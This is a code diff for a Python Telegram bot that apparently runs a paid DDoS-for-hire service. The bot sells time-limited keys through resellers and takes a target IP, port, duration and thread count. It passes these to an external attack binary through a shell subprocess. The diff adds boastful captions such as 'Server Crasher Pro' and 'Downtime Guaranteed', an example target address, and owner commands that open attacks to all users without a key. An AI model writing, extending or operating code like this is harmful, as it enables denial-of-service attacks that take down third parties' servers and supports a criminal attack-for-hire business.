@@ -2,6 +2,7 @@ import os
 import time
 import logging
 import asyncio
+import random
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
 from telegram.helpers import escape_markdown
@@ -22,6 +23,55 @@ OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @
 ALLOWED_GROUP_ID = -1002491572572  # Replace with your allowed group ID
 MAX_THREADS = 200  # Default max threads
 max_duration = 240  # Default max attack duration
+bot_open = False  # Default state is closed (requires key)
+
+# Image configuration
+START_IMAGES = [
+    {
+        'url': 'https://www.craiyon.com/image/Mfze8oH8SbO8IDZQZb36Tg',
+        'caption': '🔥 *Welcome to the Ultimate DDoS Bot!* 🔥\n\nExample 20.235.43.9 14533 120 100\n\n💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* 💀\n\n⚠️ *Use responsibly* ⚠️'
+    },
+    {
+        'url': 'https://www.craiyon.com/image/KC4CfJPuQTuKdSdlrkiczg',
+        'caption': '⚡ *Powerful DDoS Tool* ⚡\n\nRedeem your key to get started!\n\n🔑 *Example 20.235.43.9 14533 120 100* 🔑'
+    },
+    {
+        'url': 'https://www.craiyon.com/image/A3ol0NRAQc2N3C62DXcfpA',
+        'caption': '🌪️ *Unleash the Storm* 🌪️\n\nExample 20.235.43.9 14533 120 100\n\n⚠️ *Use responsibly* ⚠️'
+    },
+    {
+        'url': 'https://www.craiyon.com/image/IErJnUlDTkCvcWBeTZX8qQ',
+        'caption': '💣 *Target Elimination Mode* 💣\n\nExample 20.235.43.9 14533 120 100\n\n🎯 *Precision strikes guaranteed* 🎯'
+    },
+    {
+        'url': 'https://www.craiyon.com/image/073Vnr7jQpGUkSMr6Rrvjw',
+        'caption': '🖥️ *Server Crasher Pro* 🖥️\n\nExample 20.235.43.9 14533 120 100\n\n☠️ *Leave no trace fuck that shit* ☠️'
+    },
+    {
+        'url': 'https://www.craiyon.com/image/XgSNsdopTYGnlDsVC4PnSw',
+        'caption': '🌐 *Network Dominator* 🌐\n\nExample 20.235.43.9 14533 120 100\n\n⚡ *Lightning-fast attacks* ⚡'
+    },
+    {
+        'url': 'https://www.craiyon.com/image/JbBsmO9RQcy2CKQiOf_MOw',
+        'caption': '🚀 *Turbo Attack Mode* 🚀\n\nExample 20.235.43.9 14533 120 100\n\n💥 *Maximum destruction* 💥'
+    },
+    {
+        'url': 'https://www.craiyon.com/image/yF1wqEx7TuuAfoBLK0Zmag',
+        'caption': '🛡️ *Bypass All Protections* 🛡️\n\nExample 20.235.43.9 14533 120 100\n\n🔓 *No firewall can stop us* 🔓'
+    },
+    {
+        'url': 'https://www.craiyon.com/image/XuS2HNGdTFKqGkpAGzzrqg',
+        'caption': '👑 *Elite Hacking Toolkit* 👑\n\nExample 20.235.43.9 14533 120 100\n\n🔮 *The future of pentesting* 🔮'
+    },
+    {
+        'url': 'https://www.craiyon.com/image/iRyN9awaQIeFgjqVVucIlA',
+        'caption': '📉 *Downtime Guaranteed* 📉\n\nExample 20.235.43.9 14533 120 100\n\n⏱️ *24/7 attack availability with stability* ⏱️'
+    },
+    {
+        'url': 'https://www.craiyon.com/image/bAhq_xScRm-wk-hD9GzUrw',
+        'caption': '🤖 *AI-Powered Attacks* 🤖\n\nExample 20.235.43.9 14533 120 100\n\n🧠 *Machine learning destruction* 🧠'
+    },
+]
 
 # File to store key data
 KEY_FILE = "keys.txt"
@@ -30,6 +80,7 @@ KEY_FILE = "keys.txt"
 keys = {}  # Stores active keys and their expiration time
 redeemed_users = {}  # Tracks users who have redeemed keys and their expiration time
 redeemed_keys_info = {}  # Tracks which user redeemed which key
+feedback_waiting = {}  # Tracks users who are waiting to provide feedback
 
 # Reseller System
 resellers = set()  # Stores reseller user IDs
@@ -67,7 +118,7 @@ running_attacks = {}
 group_user_keyboard = [
     ['Start', 'Attack'],
     ['Redeem Key', 'Rules'],
-    ['🔍 Status']  # New Status button with magnifying glass emoji
+    ['🔍 Status']
 ]
 group_user_markup = ReplyKeyboardMarkup(group_user_keyboard, resize_keyboard=True)
 
@@ -84,7 +135,7 @@ owner_keyboard = [
     ['Rules', 'Set Duration', 'Set Threads'],
     ['Generate Key', 'Keys', 'Delete Key'],
     ['Add Reseller', 'Remove Reseller', 'Add Coin'],
-    ['Set Cooldown']  # New button for setting global cooldown
+    ['Set Cooldown', 'OpenBot', 'CloseBot']
 ]
 owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)
 
@@ -99,7 +150,7 @@ GET_RESELLER_ID = 7
 GET_REMOVE_RESELLER_ID = 8
 GET_ADD_COIN_USER_ID = 9
 GET_ADD_COIN_AMOUNT = 10
-GET_SET_COOLDOWN = 11  # New state for setting cooldown
+GET_SET_COOLDOWN = 11
 
 # Load key data from file
 def load_keys():
@@ -110,13 +161,12 @@ def load_keys():
         for line in file:
             key_type, key_data = line.strip().split(":", 1)
             if key_type == "ACTIVE_KEY":
-                # Handle old format (key, expiration_time) and new format (key, expiration_time, generated_by)
                 parts = key_data.split(",")
                 if len(parts) == 2:
                     key, expiration_time = parts
                     keys[key] = {
                         'expiration_time': float(expiration_time),
-                        'generated_by': None  # Default to None for old keys
+                        'generated_by': None
                     }
                 elif len(parts) == 3:
                     key, expiration_time, generated_by = parts
@@ -125,7 +175,6 @@ def load_keys():
                         'generated_by': int(generated_by)
                     }
             elif key_type == "REDEEMED_KEY":
-                # Handle redeemed keys
                 key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                 redeemed_users[int(redeemed_by)] = float(expiration_time)
                 redeemed_keys_info[key] = {
@@ -136,14 +185,12 @@ def load_keys():
 # Save key data to file
 def save_keys():
     with open(KEY_FILE, "w") as file:
-        # Write active keys
         for key, key_info in keys.items():
-            if key_info['expiration_time'] > time.time():  # Only write non-expired keys
+            if key_info['expiration_time'] > time.time():
                 file.write(f"ACTIVE_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")
 
-        # Write redeemed keys
         for key, key_info in redeemed_keys_info.items():
-            if key_info['redeemed_by'] in redeemed_users:  # Only write if the user ID is still valid
+            if key_info['redeemed_by'] in redeemed_users:
                 file.write(f"REDEEMED_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]}\n")
 
 # Check if bot is used in the allowed group
@@ -163,43 +210,69 @@ def is_reseller(update: Update):
 def is_authorized_user(update: Update):
     return is_owner(update) or is_reseller(update)
 
+# Get a random start image
+def get_random_start_image():
+    return random.choice(START_IMAGES)
+
+# Open Bot Command
+async def open_bot(update: Update, context: CallbackContext):
+    if not is_owner(update):
+        await update.message.reply_text("❌ *Only the owner can use this command!*", parse_mode='Markdown')
+        return
+    
+    global bot_open
+    bot_open = True
+    await update.message.reply_text("✅ *Bot opened! All users can now attack without keys.*", parse_mode='Markdown')
+
+# Close Bot Command
+async def close_bot(update: Update, context: CallbackContext):
+    if not is_owner(update):
+        await update.message.reply_text("❌ *Only the owner can use this command!*", parse_mode='Markdown')
+        return
+    
+    global bot_open
+    bot_open = False
+    await update.message.reply_text("✅ *Bot closed! Users now need keys to attack.*", parse_mode='Markdown')
+
 # Start Command
 async def start(update: Update, context: CallbackContext):
     chat = update.effective_chat
-
-    # If the user starts the bot in a private chat
+    image = get_random_start_image()
+    
     if chat.type == "private":
         if not is_authorized_user(update):
-            # Normal users get a message saying the bot is not authorized
-            await update.message.reply_text("❌ *This bot is not authorized to use here.*", parse_mode='Markdown')
+            await update.message.reply_photo(
+                photo=image['url'],
+                caption="❌ *This bot is not authorized to use here.*",
+                parse_mode='Markdown'
+            )
             return
 
-        # If the user is authorized (owner or reseller), show the start message
-        message = (
-            "*🔥 Welcome to the battlefield! 🔥*\n\n"
-            "*Use Attack to start an attack!*\n\n"
-            "*💥 Let the war begin!*"
-        )
-
-        # Show different keyboards for owner and resellers
         if is_owner(update):
-            await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=owner_markup)
+            await update.message.reply_photo(
+                photo=image['url'],
+                caption=image['caption'],
+                parse_mode='Markdown',
+                reply_markup=owner_markup
+            )
         else:
-            await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=reseller_markup)
+            await update.message.reply_photo(
+                photo=image['url'],
+                caption=image['caption'],
+                parse_mode='Markdown',
+                reply_markup=reseller_markup
+            )
         return
 
-    # If the user starts the bot in the allowed group
     if not is_allowed_group(update):
         return
 
-    message = (
-        "*🔥 Welcome to the battlefield! 🔥*\n\n"
-        "*Use Attack to start an attack!*\n\n"
-        "*💥 Let the war begin!*"
+    await update.message.reply_photo(
+        photo=image['url'],
+        caption=image['caption'],
+        parse_mode='Markdown',
+        reply_markup=group_user_markup
     )
-
-    # Show the same keyboard for all users in the group
-    await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=group_user_markup)
 
 # Generate Key Command - Start Conversation
 async def generate_key_start(update: Update, context: CallbackContext):
@@ -216,29 +289,25 @@ async def generate_key_duration(update: Update, context: CallbackContext):
 
     if duration_str not in KEY_PRICES:
         await update.message.reply_text("❌ *Invalid format! Use 1H, 1D, or 2D.*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
 
-    # Check if the reseller has enough balance
     user_id = update.effective_user.id
     if is_reseller(update):
         price = KEY_PRICES[duration_str]
         if user_id not in reseller_balances or reseller_balances[user_id] < price:
             await update.message.reply_text(f"❌ *Insufficient balance! You need {price} coins to generate this key.*", parse_mode='Markdown')
-            return ConversationHandler.END  # Terminate the conversation
+            return ConversationHandler.END
 
-    # Generate a unique key
-    unique_key = os.urandom(4).hex().upper()  # 4 bytes = 8 characters
+    unique_key = os.urandom(4).hex().upper()
     key = f"{OWNER_USERNAME}-{duration_str}-{unique_key}"
     keys[key] = {
         'expiration_time': time.time() + (int(duration_str[:-1]) * 3600 if duration_str.endswith('H') else int(duration_str[:-1]) * 86400),
         'generated_by': user_id
     }
 
-    # Deduct coins from reseller's balance
     if is_reseller(update):
         reseller_balances[user_id] -= KEY_PRICES[duration_str]
 
-    # Save the key to the file
     save_keys()
 
     await update.message.reply_text(f"🔑 *Generated Key:* `{key}`\n\n*This key is valid for {duration_str}.*", parse_mode='Markdown')
@@ -257,42 +326,37 @@ async def redeem_key_start(update: Update, context: CallbackContext):
 async def redeem_key_input(update: Update, context: CallbackContext):
     key = update.message.text
 
-    if key in keys and keys[key]['expiration_time'] > time.time():  # Check if key is valid and not expired
+    if key in keys and keys[key]['expiration_time'] > time.time():
         user_id = update.effective_user.id
-        redeemed_users[user_id] = keys[key]['expiration_time']  # Store user's key expiration time
+        redeemed_users[user_id] = keys[key]['expiration_time']
         redeemed_keys_info[key] = {
             'redeemed_by': user_id,
             'generated_by': keys[key]['generated_by']
         }
-        del keys[key]  # Remove the key from the available keys
+        del keys[key]
 
-        # Save the updated key data to the file
         save_keys()
 
         await update.message.reply_text(f"✅ *Key redeemed successfully! You can now use the attack command for {key.split('-')[1]}.*", parse_mode='Markdown')
     else:
         await update.message.reply_text("❌ *Invalid or expired key!*", parse_mode='Markdown')
-    return ConversationHandler.END  # Terminate the conversation
+    return ConversationHandler.END
 
 # Attack Command - Start Conversation
 async def attack_start(update: Update, context: CallbackContext):
     chat = update.effective_chat
 
-    # If the user tries to use the attack command in a private chat
     if chat.type == "private":
         if not is_authorized_user(update):
-            # Normal users get a message saying the bot is not authorized
             await update.message.reply_text("❌ *This bot is not authorized to use here.*", parse_mode='Markdown')
             return ConversationHandler.END
 
-    # If the user tries to use the attack command outside the allowed group
     if not is_allowed_group(update):
         await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
         return ConversationHandler.END
 
     global last_attack_time, global_cooldown
 
-    # Check if the cooldown period is active
     current_time = time.time()
     if current_time - last_attack_time < global_cooldown:
         remaining_cooldown = int(global_cooldown - (current_time - last_attack_time))
@@ -301,13 +365,12 @@ async def attack_start(update: Update, context: CallbackContext):
 
     user_id = update.effective_user.id
 
-    # Check if the user has a valid key
-    if user_id in redeemed_users and redeemed_users[user_id] > time.time():
+    if bot_open or (user_id in redeemed_users and redeemed_users[user_id] > time.time()):
         await update.message.reply_text("⚠️ *Enter the attack arguments: <ip> <port> <duration> <threads>*", parse_mode='Markdown')
         return GET_ATTACK_ARGS
     else:
         await update.message.reply_text("❌ *You need a valid key to start an attack! Use /redeemkey to redeem a key.*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
 
 # Attack Command - Handle Attack Input
 async def attack_input(update: Update, context: CallbackContext):
@@ -316,7 +379,7 @@ async def attack_input(update: Update, context: CallbackContext):
     args = update.message.text.split()
     if len(args) != 4:
         await update.message.reply_text("❌ *Invalid input! Please enter <ip> <port> <duration> <threads>.*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
 
     ip, port, duration, threads = args
     duration = int(duration)
@@ -324,16 +387,14 @@ async def attack_input(update: Update, context: CallbackContext):
 
     if duration > max_duration:
         await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
 
     if threads > MAX_THREADS:
         await update.message.reply_text(f"❌ *Number of threads exceeds the max limit ({MAX_THREADS})!*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
 
-    # Update the last attack time
     last_attack_time = time.time()
     
-    # Add attack to running attacks
     attack_id = f"{ip}:{port}-{time.time()}"
     running_attacks[attack_id] = {
         'user_id': update.effective_user.id,
@@ -350,7 +411,6 @@ async def attack_input(update: Update, context: CallbackContext):
         parse_mode='Markdown'
     )
 
-    # Execute the external binary asynchronously without blocking
     async def run_attack():
         try:
             process = await asyncio.create_subprocess_shell(
@@ -359,14 +419,11 @@ async def attack_input(update: Update, context: CallbackContext):
                 stderr=asyncio.subprocess.PIPE
             )
 
-            # Wait for the process to complete
             stdout, stderr = await process.communicate()
 
-            # Remove from running attacks
             if attack_id in running_attacks:
                 del running_attacks[attack_id]
 
-            # Check if the process was successful
             if process.returncode == 0:
                 await update.message.reply_text(
                     f"✅ *Attack Finished!*\n"
@@ -396,7 +453,6 @@ async def attack_input(update: Update, context: CallbackContext):
                 parse_mode='Markdown'
             )
 
-    # Run the attack in the background without blocking
     asyncio.create_task(run_attack())
 
     return ConversationHandler.END
@@ -419,7 +475,7 @@ async def set_cooldown_input(update: Update, context: CallbackContext):
         await update.message.reply_text(f"✅ *Global cooldown set to {global_cooldown} seconds!*", parse_mode='Markdown')
     except ValueError:
         await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
     return ConversationHandler.END
 
 # Show Active, Redeemed, and Expired Keys
@@ -433,15 +489,12 @@ async def show_keys(update: Update, context: CallbackContext):
     redeemed_keys = []
     expired_keys = []
 
-    # Categorize keys
     for key, key_info in keys.items():
         if key_info['expiration_time'] > current_time:
-            # Active keys
             remaining_time = key_info['expiration_time'] - current_time
             hours = int(remaining_time // 3600)
             minutes = int((remaining_time % 3600) // 60)
             
-            # Handle username safely
             generated_by_username = "Unknown"
             if key_info['generated_by']:
                 try:
@@ -452,21 +505,17 @@ async def show_keys(update: Update, context: CallbackContext):
                     
             active_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Expires in {hours}h {minutes}m)")
         else:
-            # Expired keys
             expired_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Expired)")
 
     for key, key_info in redeemed_keys_info.items():
         if key_info['redeemed_by'] in redeemed_users:
-            # Redeemed keys - handle usernames safely
             redeemed_by_username = "Unknown"
             generated_by_username = "Unknown"
             
             try:
-                # Get redeemed by username
                 redeemed_chat = await context.bot.get_chat(key_info['redeemed_by'])
                 redeemed_by_username = escape_markdown(redeemed_chat.username or "NoUsername", version=2) if redeemed_chat.username else "NoUsername"
                 
-                # Get generated by username
                 if key_info['generated_by']:
                     generated_chat = await context.bot.get_chat(key_info['generated_by'])
                     generated_by_username = escape_markdown(generated_chat.username or "NoUsername", version=2) if generated_chat.username else "NoUsername"
@@ -475,7 +524,6 @@ async def show_keys(update: Update, context: CallbackContext):
                 
             redeemed_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Redeemed by @{redeemed_by_username})")
 
-    # Prepare the message
     message = "*🗝️ Active Keys:*\n"
     if active_keys:
         message += "\n".join(active_keys) + "\n\n"
@@ -513,7 +561,7 @@ async def set_duration_input(update: Update, context: CallbackContext):
         await update.message.reply_text(f"✅ *Maximum attack duration set to {max_duration} seconds!*", parse_mode='Markdown')
     except ValueError:
         await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
     return ConversationHandler.END
 
 # Set Threads Command - Start Conversation
@@ -533,7 +581,7 @@ async def set_threads_input(update: Update, context: CallbackContext):
         await update.message.reply_text(f"✅ *Maximum threads set to {MAX_THREADS}!*", parse_mode='Markdown')
     except ValueError:
         await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
     return ConversationHandler.END
 
 # Delete Key Command - Start Conversation
@@ -560,7 +608,6 @@ async def delete_key_input(update: Update, context: CallbackContext):
     else:
         await update.message.reply_text("❌ *Key not found!*", parse_mode='Markdown')
 
-    # Save the updated key data to the file
     save_keys()
     return ConversationHandler.END
 
@@ -580,11 +627,11 @@ async def add_reseller_input(update: Update, context: CallbackContext):
     try:
         user_id = int(user_id_str)
         resellers.add(user_id)
-        reseller_balances[user_id] = 0  # Initialize balance to 0
+        reseller_balances[user_id] = 0
         await update.message.reply_text(f"✅ *Reseller with ID {user_id} added successfully!*", parse_mode='Markdown')
     except ValueError:
         await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
 
     return ConversationHandler.END
 
@@ -612,7 +659,7 @@ async def remove_reseller_input(update: Update, context: CallbackContext):
             await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
     except ValueError:
         await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
 
     return ConversationHandler.END
 
@@ -637,10 +684,10 @@ async def add_coin_user_id(update: Update, context: CallbackContext):
             return GET_ADD_COIN_AMOUNT
         else:
             await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
-            return ConversationHandler.END  # Terminate the conversation
+            return ConversationHandler.END
     except ValueError:
         await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
 
     return ConversationHandler.END
 
@@ -658,7 +705,7 @@ async def add_coin_amount(update: Update, context: CallbackContext):
             await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
     except ValueError:
         await update.message.reply_text("❌ *Invalid amount! Please enter a number.*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
+        return ConversationHandler.END
 
     return ConversationHandler.END
 
@@ -694,11 +741,9 @@ async def check_key_status(update: Update, context: CallbackContext):
         remaining_time = expiration_time - current_time
         
         if remaining_time > 0:
-            # Calculate remaining time in hours and minutes
             hours = int(remaining_time // 3600)
             minutes = int((remaining_time % 3600) // 60)
             
-            # Find the key associated with this user
             key_info = None
             for key, info in redeemed_keys_info.items():
                 if info['redeemed_by'] == user_id:
@@ -758,12 +803,15 @@ async def handle_button_click(update: Update, context: CallbackContext):
     chat = update.effective_chat
     query = update.message.text
 
-    # If the user is a normal user in a private chat
     if chat.type == "private" and not is_authorized_user(update):
-        await update.message.reply_text("❌ *This bot is not authorized to use here.*", parse_mode='Markdown')
+        image = get_random_start_image()
+        await update.message.reply_photo(
+            photo=image['url'],
+            caption="❌ *This bot is not authorized to use here.*",
+            parse_mode='Markdown'
+        )
         return
 
-    # Map button text to commands
     if query == 'Start':
         await start(update, context)
     elif query == 'Attack':
@@ -792,8 +840,12 @@ async def handle_button_click(update: Update, context: CallbackContext):
         await rules(update, context)
     elif query == 'Set Cooldown':
         await set_cooldown_start(update, context)
-    elif query == '🔍 Status':  # Handle the new Status button
+    elif query == '🔍 Status':
         await check_key_status(update, context)
+    elif query == 'OpenBot':
+        await open_bot(update, context)
+    elif query == 'CloseBot':
+        await close_bot(update, context)
 
 # Periodic Task to Check for Expired Keys
 async def check_expired_keys(context: CallbackContext):
@@ -801,29 +853,23 @@ async def check_expired_keys(context: CallbackContext):
     expired_users = [user_id for user_id, expiration_time in redeemed_users.items() if expiration_time <= current_time]
     
     for user_id in expired_users:
-        # Remove expired user from redeemed_users
         del redeemed_users[user_id]
 
-        # Remove any keys associated with the expired user from redeemed_keys_info
         expired_keys = [key for key, uid in redeemed_keys_info.items() if uid == user_id]
         for key in expired_keys:
             del redeemed_keys_info[key]
 
-    # Save the updated key data to the file
     save_keys()
     logging.info(f"Expired users and keys removed: {expired_users}")
 
 # Main Bot Setup
 def main():
-    # Load key data from file
     load_keys()
 
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
 
-    # Add a job queue to check for expired keys every minute
     application.job_queue.run_repeating(check_expired_keys, interval=60, first=0)
 
-    # Conversation Handlers
     generate_key_handler = ConversationHandler(
         entry_points=[CommandHandler("generatekey", generate_key_start), MessageHandler(filters.Text("Generate Key"), generate_key_start)],
         states={
@@ -905,7 +951,6 @@ def main():
         fallbacks=[CommandHandler("cancel", cancel_conversation)],
     )
 
-    # Add all handlers
     application.add_handler(generate_key_handler)
     application.add_handler(redeem_key_handler)
     application.add_handler(attack_handler)
